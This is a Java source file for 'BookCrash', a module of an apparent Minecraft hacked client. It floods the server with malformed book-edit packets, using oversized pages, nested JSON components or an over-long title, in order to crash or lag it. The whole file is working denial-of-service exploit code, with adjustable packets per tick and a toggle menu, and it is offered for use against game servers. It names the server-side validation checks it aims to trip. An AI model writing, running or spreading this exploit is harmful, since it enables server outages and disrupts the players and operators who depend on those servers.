package com.tricrotism.modules.crash;

import com.tricrotism.SageFang;
import com.tricrotism.api.eventbus.EventHandler;
import com.tricrotism.api.menus.Menu;
import com.tricrotism.api.modules.Module;
import com.tricrotism.events.game.GameQuitEvent;
import com.tricrotism.events.world.TickEvent;
import com.tricrotism.mixin.accessors.ConnectionAccessor;
import imgui.ImGui;
import imgui.ImGuiIO;
import imgui.flag.ImGuiWindowFlags;
import imgui.type.ImInt;
import io.avaje.config.Config;
import io.netty.channel.Channel;
import net.minecraft.client.Minecraft;
import net.minecraft.network.Connection;
import net.minecraft.network.protocol.game.ServerboundEditBookPacket;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;

/**
 * Book crash exploit — abuses ServerboundEditBookPacket to trigger various
 * server-side book validation failures (LPX checks BOOK_A, BOOK_B, PAYLOAD_B, ITEM).
 * <p>
 * Modes:
 * <ul>
 *   <li><b>Flood</b> — blast many book packets per tick to stall netty threads</li>
 *   <li><b>Large Pages</b> — pages filled with maximum text to exceed per-item byte limits</li>
 *   <li><b>Deep JSON</b> — pages with deeply nested text components to exceed component limits</li>
 *   <li><b>Long Title</b> — book title exceeding max length</li>
 * </ul>
 */
public class BookCrash extends Module implements Menu {

    public static final BookCrash instance = new BookCrash();

    private static final String[] MODE_LABELS = {"Flood", "Large Pages", "Deep JSON", "Long Title"};
    private static final int MODE_FLOOD = 0;
    private static final int MODE_LARGE_PAGES = 1;
    private static final int MODE_DEEP_JSON = 2;
    private static final int MODE_LONG_TITLE = 3;

    /**
     * Cached page list, rebuilt when config changes or on first use.
     */
    private List<String> cachedPages;
    private int cachedMode = -1;
    private int cachedPageCount = -1;
    private int cachedPageSize = -1;

    public BookCrash() {
        super("bookcrash", "Book Crash", "Exploit book packet vulnerabilities to crash or lag servers.", "Combat");
    }

    private int mode() {
        return Config.getInt(baseConfig + ".mode", MODE_FLOOD);
    }

    private void setMode(int v) {
        Config.setProperty(baseConfig + ".mode", String.valueOf(v));
        invalidateCache();
    }

    private int speed() {
        return Config.getInt(baseConfig + ".speed", 20);
    }

    private void setSpeed(int v) {
        Config.setProperty(baseConfig + ".speed", String.valueOf(v));
    }

    private int pageCount() {
        return Config.getInt(baseConfig + ".pageCount", 100);
    }

    private void setPageCount(int v) {
        Config.setProperty(baseConfig + ".pageCount", String.valueOf(v));
        invalidateCache();
    }

    private int pageSize() {
        return Config.getInt(baseConfig + ".pageSize", 32000);
    }

    private void setPageSize(int v) {
        Config.setProperty(baseConfig + ".pageSize", String.valueOf(v));
        invalidateCache();
    }

    private void invalidateCache() {
        cachedPages = null;
    }

    private List<String> getPages() {
        int m = mode();
        int pc = pageCount();
        int ps = pageSize();
        if (cachedPages != null && m == cachedMode && pc == cachedPageCount && ps == cachedPageSize) {
            return cachedPages;
        }

        cachedMode = m;
        cachedPageCount = pc;
        cachedPageSize = ps;

        List<String> pages = new ArrayList<>(pc);
        switch (m) {
            case MODE_FLOOD, MODE_LARGE_PAGES -> {
                String fill = "A".repeat(Math.min(ps, 32767));
                for (int i = 0; i < pc; i++) {
                    pages.add(fill);
                }
            }
            case MODE_DEEP_JSON -> {
                String nested = buildNestedJson(20);
                for (int i = 0; i < pc; i++) {
                    pages.add(nested);
                }
            }
            case MODE_LONG_TITLE -> {
                // Title mode uses minimal pages; the exploit is in the title length.
                String fill = "A".repeat(Math.min(ps, 32767));
                for (int i = 0; i < Math.min(pc, 10); i++) {
                    pages.add(fill);
                }
            }
            default -> pages.add("");
        }

        cachedPages = pages;
        return pages;
    }

    /**
     * Build deeply nested JSON text component:
     * {@code {"text":"","extra":[{"text":"","extra":[...]}]}}
     */
    private static String buildNestedJson(int depth) {
        String sb = "{\"text\":\"\",\"extra\":[".repeat(Math.max(0, depth)) +
            "{\"text\":\"x\"}" +
            "]}".repeat(Math.max(0, depth));
        return sb;
    }

    private Optional<String> getTitle() {
        if (mode() == MODE_LONG_TITLE) {
            return Optional.of("A".repeat(5000));
        }
        return Optional.empty();
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!isActive()) return;

        Minecraft mc = Minecraft.getInstance();
        if (mc.player == null || mc.getConnection() == null) return;

        Connection connection = mc.getConnection().getConnection();
        Channel channel = ((ConnectionAccessor) connection).sagefang$getChannel();
        if (channel == null || !channel.isOpen()) return;

        int slot = mc.player.getInventory().getSelectedSlot();
        List<String> pages = getPages();
        Optional<String> title = getTitle();

        int count = speed();
        for (int i = 0; i < count; i++) {
            channel.write(new ServerboundEditBookPacket(slot, pages, title));
        }
        channel.flush();
    }

    @EventHandler
    private void onGameLeft(GameQuitEvent event) {
        if (isActive()) {
            toggle();
        }
    }

    @Override
    public void frame(ImGuiIO io) {
        try {
            if (!isVisible()) return;

            int flags = ImGuiWindowFlags.AlwaysAutoResize;
            ImGui.setNextWindowBgAlpha(0.45f);
            ImGui.begin(title, flags);

            if (ImGui.checkbox("Enabled##bcEnabled", isActive())) {
                toggle();
            }
            ImGui.separator();

            // Mode combo
            ImInt modeInt = new ImInt(mode());
            if (ImGui.combo("Mode##bcMode", modeInt, MODE_LABELS)) {
                setMode(modeInt.get());
            }

            // Speed slider
            int[] speedArr = {speed()};
            if (ImGui.sliderInt("Packets/tick##bcSpeed", speedArr, 1, 100)) {
                setSpeed(speedArr[0]);
            }

            int m = mode();

            // Page Count slider (relevant for all modes)
            if (m != MODE_LONG_TITLE) {
                int[] pcArr = {pageCount()};
                if (ImGui.sliderInt("Page Count##bcPageCount", pcArr, 1, 100)) {
                    setPageCount(pcArr[0]);
                }
            }

            // Page Size slider (relevant for Flood, Large Pages, Long Title)
            if (m != MODE_DEEP_JSON) {
                int[] psArr = {pageSize()};
                if (ImGui.sliderInt("Page Size##bcPageSize", psArr, 1, 32767)) {
                    setPageSize(psArr[0]);
                }
            }

            ImGui.end();
        } catch (Exception e) {
            SageFang.LOGGER.error("Error in BookCrash menu", e);
        }
    }
}
